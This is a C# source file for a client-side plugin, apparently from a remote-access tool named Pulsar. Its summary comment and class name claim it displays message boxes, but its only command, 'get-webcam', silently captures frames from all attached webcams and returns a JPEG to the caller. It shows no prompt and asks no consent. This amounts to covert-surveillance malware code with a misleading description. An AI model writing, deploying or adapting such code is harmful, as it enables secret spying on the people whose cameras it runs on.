using Pulsar.Common.Plugins;
using System;
using System.Threading;

namespace Pulsar.Plugin.UserCheck.Client
{
    /// <summary>
    /// Client-side plugin that displays message boxes and returns user's response
    /// </summary>
    public class MessageBoxClientPlugin : IUniversalPlugin
    {
        public string PluginId => "UserCheckClient";
        public string Version => "1.0.0";
        public string[] SupportedCommands => new[] { "get-webcam" };

        private bool _isComplete = false;
        public bool IsComplete => _isComplete;

        public void Initialize(Object initData)
        {
            // Plugin loaded and ready
            // initData could contain default configuration if needed
        }

        public PluginResult ExecuteCommand(string command, Object parameters)
        {
            switch (command)
            {
                case "get-webcam":
                    return GetWebcamImage(parameters);

                default:
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"Unknown command: {command}",
                        ShouldUnload = true
                    };
            }
        }

        private PluginResult GetWebcamImage(Object parameters)
        {
            WebcamSnapshot snapshot = new WebcamSnapshot();
            var captureTask = snapshot.CaptureSingleFrameFromAllDevices();
            captureTask.Wait();

            Thread.Sleep(500);
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            if (snapshot.Frames.Count == 0)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "No webcam frames captured.",
                    ShouldUnload = true
                };
            }

            foreach (var frame in snapshot.Frames)
            {
                using (var ms = new System.IO.MemoryStream())
                {
                    frame.Value.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    var result = new PluginResult
                    {
                        Success = true,
                        Data = ms.ToArray(),
                        ShouldUnload = true
                    };

                    foreach (var bmp in snapshot.Frames.Values)
                    {
                        bmp?.Dispose();
                    }

                    return result;
                }
            }

            return new PluginResult
            {
                Success = false,
                Message = "Unexpected error capturing webcam image.",
                ShouldUnload = true
            };
        }

        public void Cleanup()
        {
            _isComplete = true;
        }
    }
}